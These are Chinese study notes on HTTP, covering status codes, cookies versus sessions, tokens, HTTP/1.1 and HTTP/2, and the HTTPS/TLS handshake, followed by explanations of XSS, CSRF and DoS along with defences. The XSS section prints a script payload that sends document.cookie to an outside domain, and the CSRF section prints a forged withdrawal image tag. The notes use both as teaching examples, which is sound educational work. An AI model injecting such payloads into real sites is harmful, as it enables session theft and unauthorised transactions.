# HTTP协议特点

* 支持客户/服务器模式
* 简单快速
* 灵活
* 无连接
* 无状态

# 请求/响应步骤

* 客户端连接Web服务器
* 发送HTTP请求
* 服务器接受请求并返回HTTP响应
*  释放连接TCP连接
* 客户端浏览器解析HTML内容

# 在浏览器输入URL后经历的流程

* DNS解析
  * 查询DNS缓存
    * 浏览器缓存
    * 系统缓存
    * 路由器缓存
    * IPS服务器缓存
    * 根域名服务器缓存
    * 顶级域名服务器缓存
* TCP连接
* 发送HTTP请求
* 服务器处理并返回HTTP报文
* 浏览器解析渲染页面
* 连接结束

## [DNS使用的协议](https://draveness.me/whys-the-design-dns-udp-tcp/)

*  DNS 不仅使用了 UDP 协议，也使用了 TCP 协议
* UDP 协议
  - DNS 查询的数据包较小、机制简单；
  - UDP 协议的额外开销小、有着更好的性能表现；
* TCP 协议
  - DNS 查询由于 DNSSEC 和 IPv6 的引入迅速膨胀，导致 DNS 响应经常超过 MTU 造成数据的分片和丢失，我们需要依靠更加可靠的 TCP 协议完成数据的传输；
  - 随着 DNS 查询中包含的数据不断增加，TCP 协议头以及三次握手带来的额外开销比例逐渐降低，不再是占据总传输数据大小的主要部分；
* 无论是选择 UDP 还是 TCP，最核心的矛盾就在于需要传输的数据包大小，**如果数据包小到一定程度，UDP 协议绝对最佳的选择，但是当数据包逐渐增大直到突破 512 字节以及 MTU 1500 字节的限制时，我们也只能选择使用更可靠的 TCP 协议**来传输 DNS 查询和相应。

# HTTP状态码

* 1xx	

  * 指示信息--表示请求已接收,继续处理
* 2xx

  * 200 正常处理
  
    204 成功处理，但服务器没有新数据返回，显示页面不更新
  
    206 对服务器进行范围请求，只返回一部分数据
* 3xx**一般表示重定向**

  * 301 请求的资源已分配了新的URI中，URL地址改变了。【永久重定向】
* 302 请求的资源临时分配了新的URI中，URL地址没变【临时重定向/转发】
  * 303 与302相同的功能，但明确客户端应该采用GET方式来获取资源
* 304 发送了附带请求，但不符合条件【返回未过期的缓存数据】
  * [305](https://juejin.im/post/6844903983874572295) 被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。
* 307 与302相同，但不会把POST请求变成GET
* 4xx **客户端错误**--请求有语法错误或请求无法实现

  * 400 BadRequest--客户端请求有语法错误,不能被服务器所理解
  * 401 Unauthorized--请求未经授权,这个状态代码必须和WWW-Authenticate报头一起使用
  * 403 Forbidden--服务器收到请求,但是拒绝提供服务
  * 404 Not Found--请求资源不存在
* 5xx **服务端错误--服务器未能实现合法的请求**
  * 500 Internal Server Error-- 报务器发生不可预期的错误
  * 503 Server Unavailable--服务器当前不能处理客户端的请求,一段时间后可能恢复正常



# GET请求和POST请求的区别

* HTTP报文层面
  * GET将请求信息放在URL(URl长度限制)
  * POST放在报文体中
* 数据库层面
  * GET符合幂等性和安全性
  * POST不符合
* 其他层面
  * GET可以被(CDN缓存,被存储
  * POST不可

# Cookie和Session

## Session的实现方式

* 使用Cookie来实现(JSESSIONID)
  * Session运行依赖session id，而session id存在cookie中，若浏览器禁用cookie，则session失效（可URL中传送session_id）
  * Session利用cookie进行信息处理,用户进行信息请求后,服务端就在浏览器上创建一个cookie,当这个session结束时,其实是Cookie过期了,它的`maxAge`属性一般为-1
* 使用URL回写来实现
  * TOMCAT判断客户端浏览器是否支持Cookie的依据是请求中是否含有Cookie。尽管客户端可能会支持Cookie，但是由于第一次请求时不会携带任何Cookie（因为并无任何Cookie可以携带），URL地址重写后的地址中仍然会带有`jsessionid`。
  * 当第二次访问时服务器已经在浏览器中写入`Cookie`了，因此URL地址重写后的地址中就不会带有`jsessionid`了。

## 区别

* Cookie数据存放在客户的浏览器上,Session数据放在服务器上
* Session相对Cookie更安全
  * 若考虑减轻服务器负担,应当使用Cookie
* Session能存储任意Java对象，Cookie只能存储String类型对象
* 单个cookie保存不超过4k,很多浏览器都一个站点最多保存20个Cookie

## 相同点

* 都是用来跟踪浏览器用户身份的会话方式

## Session何时失效

* 服务器将长时间没有活动的Session从服务器内存中清除.Tomcat默认失效时间为20分钟
* 调用Session的invalidate方法

## Session持久化

* 将Session对象从内存中转移到硬盘或数据库
  * 减少系统资源占用
  * 若Servlet容器关闭或重启，持久化的Session对象可重新加载，对于客户端还是使用同一session

## 如何防止cookie欺骗

* cookie加个加密算法
* 加个时间戳和IP戳,让cookie在同个IP下一定时间内失效
* 不管cookies里保存多少字段,还要增加一个验证字段(MAC码),使用上面所有字段的内容合算出来的摘要再用一种加密算法(如使用服务器的主密钥)加密.这样从cookie得到数据后,再判断一下MAC码可知cookies字段有没改过

# token

* 组成
  * 登陆时由服务端生成
  * UUID（用户唯一身份标识）+time（时间戳）+sign(签名)+[常用固定参数（可选）]
* 使用
  * 服务端生成后随http响应保存在客户端的cookies，或local storage中。随客户端请求发送至服务端，
  * 用于单点登陆身份验证，防止跨站点请求伪造等
* 有效期
  * 根据token中的时间戳跟当前时间对比计算，看过期与否，有效期默认7天
* 优缺点
  * 支持跨域访问，防止信息外泄，可以在多个服务间共享。不像session存储于服务器内存中，不影响服务器的性能，但需要额外的时间开销
  * 防止CSRF攻击
    * 登录受信任网站A，并在本地生成Cookie。
    * 在不登出A的情况下，访问危险网站B。


# [HTTP2.0与HTTP1.0区别](https://juejin.im/entry/5981c5df518825359a2b9476)

* **新的二进制格式**（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。
* **多路复用**（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。
* **header压缩**，如上文中所言，对前面提到过HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。
* **服务端推送**（server push），同SPDY一样，HTTP2.0也具有server push功能。

# [HTTP1.0与HTTP1.1的区别](https://juejin.im/entry/5981c5df518825359a2b9476)

* **缓存处理**，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。
* **带宽优化及网络连接的使用**，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，**它允许只请求资源的某个部分**，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。
* **错误通知的管理**，**在HTTP1.1中新增了24个错误状态响应码**，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。
* **Host头处理**，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。**HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（**400 Bad Request）。
* **长连接**，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，**在一个TCP连接上可以传送多个HTTP请求和响应**，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。

## [**HTTP2.0的多路复用和HTTP1.X中的长连接复用有什么区别？**](https://juejin.im/entry/5981c5df518825359a2b9476)

- HTTP/1.* 一次请求-响应，建立一个连接，用完关闭；每一个请求都要建立一个连接；
- HTTP/1.1 Pipeling解决方式为，若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞，毫无办法，也就是人们常说的线头阻塞；
- HTTP/2多个请求可同时在一个连接上并行执行。某个请求任务耗时严重，不会影响到其它连接的正常执行；

## **为什么需要头部压缩？**

* 假定一个页面有100个资源需要加载（这个数量对于今天的Web而言还是挺保守的）, 而每一次请求都有1kb的消息头（这同样也并不少见，因为Cookie和引用等东西的存在）, 则至少需要多消耗100kb来获取这些消息头。HTTP2.0可以维护一个字典，差量更新HTTP头部，大大降低因头部传输产生的流量。

## HTTP2.0多路复用有多好？

* HTTP 性能优化的关键并不在于高带宽，而是低延迟。TCP 连接会随着时间进行自我「调谐」，起初会限制连接的最大速度，如果数据成功传输，会随着时间的推移提高传输的速度。这种调谐则被称为 TCP **慢启动**。由于这种原因，让原本就具有突发性和短时性的 HTTP 连接变的十分低效。HTTP/2 通过让所有数据流共用同一个连接，可以更有效地使用 TCP 连接，让高带宽也能真正的服务于 HTTP 的性能提升。

## http如何保持连接 

- HTTP/1.0中默认使用的是短连接，每一次HTTP操作就建立一次连接，任务结束就中断
- HTTP/1.1默认使用长连接，并在响应头加入`Connection:keep-alive`
  - 当一个网页打开后，用于传输数据的TCP不会关闭，再次访问此服务器网页时会继续使用该连接
  - 实质是TCP协议的长连接和短连接

## [TCP长连接如何保持的](https://github.com/MicroKibaco/CrazyDailyQuestion/issues/49)

* 长链接是通过发送心跳来保持连接的
  长连接的重试：
  1. 客户端网络空闲5秒没有进行写操作时，进行发送一次ping心跳给服务端；
  2. 客户端如果在下一个发送ping心跳周期来临时，还没有收到服务端ping的心跳应答，则失败心跳计数器加1；
  3. 每当客户端收到服务端的ping心跳应答后，失败心跳计数器清零；
  4. 如果连续超过3次没有收到服务端的心跳回复，则断开当前连接，在5秒后进行重连操作，直到重连成功

## 什么时候用长连接，短连接

- 长连接
  - 操作频繁，点对点的通讯，而且连接数不能太多
  - 如数据库的连接
- 短连接
  - Web的http服务，长连接对服务端会消耗一定资源，而web连接频繁使用短连接更节省资源

# HTTPS

## [Https与Http的区别](https://juejin.im/entry/5981c5df518825359a2b9476)

- HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。
- HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。
- HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。
- HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。

![img](https://user-gold-cdn.xitu.io/2017/8/3/b6daabee3a064fdc750cf0ff41c69871?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

## [Https建立连接过程](https://www.jianshu.com/p/33d0f8631f90)

* **客户端访问https连接**

  * 这一步，就是相当于我们在浏览器上输入url回车的过程。这个时候浏览器或者客户端（接下来统一为客户端）会把我们客户端支持的加密算法Cipher Suite（密钥算法套件）带给服务端

* ##### 服务端发送证书（公钥）给客户端

  * 服务端接收Cipher后，和自己支持的加密算法进行比对，如果不符合，则断开连接。否则**，服务端会把符合的算法和证书发给客户端，包括证书时间、证书日期、证书颁发的机构。**

* ##### 2.2.4- 2.2.5 客户端验证服务端的证书

  * 1、**客户端验证证书**，包括颁发证书的机构是否合法与是否过期，证书中包含的网站地址是否与正在访问的地址一致等

  * 2、验证通过后（或者用户接受了不信任的证书），**客户端会生成一个随机字符串，然后用服务端的公钥进行加密。这里就保证了只有服务端才能看到这串随机字符串**（因为服务端拥有公钥对应的私钥，RSA解密，可以知道客户端的随机字符串）。

  * 3、生成握手信息  用约定好的HASH算法，对握手信息进行取HASH，然后**用随机字符串加密握手信息和握手信息的签名HASH值，把结果发给服务端**。这里之所以要带上握手信息的HASH是因为，防止信息被篡改。如果信息被篡改，那么服务端接收到信息进行HASH时，就会发现HASH值和客户端传回来的不一样。这里就保证了信息不会被篡改。

* ##### 2.2.6 - 2.2.7 服务端接收加密信息，解密得到客户端提供的随机字符串

  * 服务端接收到加密信息后，**首先用私钥解密得到随机字符串。然后用随机字符串解密握手信息**，获得握手信息和握手信息的HASH值，服务端对握手信息进行HASH，比对客户端传回来的HASH。如果相同，则说明信息没有被篡改。

  * 服务端验证完客户端的信息以后，同样使用随机字符串加密握手信息和握手信息的HASH值发给客户端。

* ##### 2.2.8 客户端验证服务端返回的握手信息，完成握手

  * 客户端接收到服务端发回来的握手信息后，用一开始生成的随机字符串对密文进行解密，得到握手信息和握手信息的HASH值，像上一步服务端验证一样对握手信息进行校验，**校验通过后，握手完毕**。从这里开始，**客户端和服务端的通信就使用那串随机字符串进行AES对称加密通信**。

* #### 2.3 验证总结

  * 使用RSA非对称算法，服务端向客户端发送公钥，**公钥包含了域名、颁发机构、过期日期。保证了公钥的合法性和服务端的身份正确性**（而不会被黑客冒充）
  * 客户端向第三方验证公钥的合法性，验证通过后向服务端约定对称加密的随机字符号。保证了随机字符串只有通信双方知道。
     接下来的通信就使用这个随机字符号进行加密通信。因为随机字符串只有双方知道，所以信息不会被截获。

## [客户端验证证书的合法性](https://www.jianshu.com/p/33d0f8631f90)

* 为了验证证书的合法性，首先客户端要知道一些合法的证书机构，这就是我们所说的根证书。而根证书会保存在用户的浏览器或者其它客户端，像jdk的根证书列表。

* 当然证书不可能只有几个机构进行颁发的，所以证书的颁发是一级一级的。客户端在验证证书也是一级一级往下验证。下面是阿里的证书：





![img](https:////upload-images.jianshu.io/upload_images/9294298-4a1e99efb189af38.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/409/format/webp)

阿里证书

* 最顶级的VeriSign Class 3 Public Primary Certification Authori... 就是根证书了， 这个证书一般会保存在客户端，在客户端安装时就有一组根证书了，如果服务端根证书在客户端的信任列表中，那么就会向根证书验证二级证书的合法性，然后再向二级证书机构验证三级证书的合法性，以此类推。

## [SSL/TLS](https://mp.weixin.qq.com/s?__biz=Mzg2MjEwMjI1Mg==&mid=2247492447&idx=2&sn=3be29da93c22a3bc6229864f9f132333&chksm=ce0e54dcf979ddcacc01e1de018b7ac546469da293431342abd91a18bd137eb4421af9ba2e35&scene=90&xtrack=1&subscene=93&clicktime=1584536737&enterid=1584536737&ascene=56&devicetype=android-28&version=27000c37&nettype=3gnet&abtest_cookie=AAACAA%3D%3D&lang=zh_CN&exportkey=AcmlXA0esDsHZzA1gEdl5nE%3D&pass_ticket=irm%2BHTRtaZYTm4GA1uVi1bNLpr8shcXNEyWzng7T6o60Iro22tS1e93iOqSoqotA&wx_header=1)

* SSL 是一个独立的协议，不只有 HTTP 可以使用，其他应用层协议也可以使用，比如 `SMTP(电子邮件协议)`、`Telnet(远程登录协议)` 等都可以使用。处于OSI七层模型第五层--会话层

* SSL 即`安全套接字层`，它在 OSI 七层网络模型中处于第五层，SSL 在 1999 年被 `IETF(互联网工程组)`更名为 TLS ，即`传输安全层`，直到现在，TLS 一共出现过三个版本，1.1、1.2 和 1.3 ，目前最广泛使用的是 1.2，所以接下来的探讨都是基于 TLS 1.2 的版本上的。

* TLS 在根本上使用`对称加密`和 `非对称加密` 两种形式。**TLS 是使用`对称加密`和`非对称加密` 的混合加密方式来实现机密性。**

  ### 对称加密

  * `对称加密(Symmetrical Encryption)`顾名思义就是指**加密和解密时使用的密钥都是同样的密钥**。只要保证了密钥的安全性，那么整个通信过程也就是具有了机密性。**对称加密存在风险**。

  ![img](https://mmbiz.qpic.cn/mmbiz_png/libYRuvULTdVx8X5NPwkUl0kJzNPoo0jFZWtH35sBYfuVAFemVoA6JsMh6wYmntZg6iatCGh8AgmktXhdEc0rwQg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
  * TLS 里面有比较多的加密算法可供使用，比如 DES、3DES、AES、ChaCha20、TDEA、Blowfish、RC2、RC4、RC5、IDEA、SKIPJACK 等。目前最常用的是  AES-128, AES-192、AES-256 和 ChaCha20。

  ### 非对称加密

  * `非对称加密(Asymmetrical Encryption)` 也被称为`公钥加密`，相对于对称加密来说，非对称加密是一种新的改良加密方式。密钥通过网络传输交换，它能够确保及时密钥被拦截，也不会暴露数据信息。非对称加密中有两个密钥，一个是公钥，一个是私钥，公钥进行加密，私钥进行解密。公开密钥可供任何人使用，私钥只有你自己能够知道。

    ![img](https://mmbiz.qpic.cn/mmbiz_png/libYRuvULTdVx8X5NPwkUl0kJzNPoo0jFW0icuPhVqHB0cJN5G3XBLibAAYLIGZ2vqO4OMHoC48oNHqItUCzzNgLQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)


# [跨站脚本攻击（XSS）]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

* 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 **HTML** 和 **JavaScript**。

## 攻击原理

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

* 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果浏览的这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以**通过这个 Cookie 登录被攻击者的账号**了。

## [危害]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

- 窃取用户的 Cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

## [防范手段]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

* 设置 Cookie 为 HttpOnly
  * 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 `document.cookie` 获取用户 Cookie 信息。

* 过滤特殊字符
  * 例如将 `<` 转义为 `<`，将 `>` 转义为 `>`，从而避免 HTML 和 Jascript 代码的运行。

# [跨站请求伪造(CSRF)]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

* 跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段**欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作**（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。
* XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

## 攻击原理

* 一个恶意攻击者可以在另一个网站上放置如下代码：

  ```html
  <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
  ```
  * 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。
  * 通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

## [防范手段]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

* 检查 Referer 首部字段
  * Referer 首部字段位于 HTTP 报文中，**用于标识请求来源的地址**。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。
  * 无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
* 添加校验 Token
  * 在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。**例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数**。
*  输入验证码
  * 因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

# [拒绝服务攻击(DoS)]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))

* 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

* 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。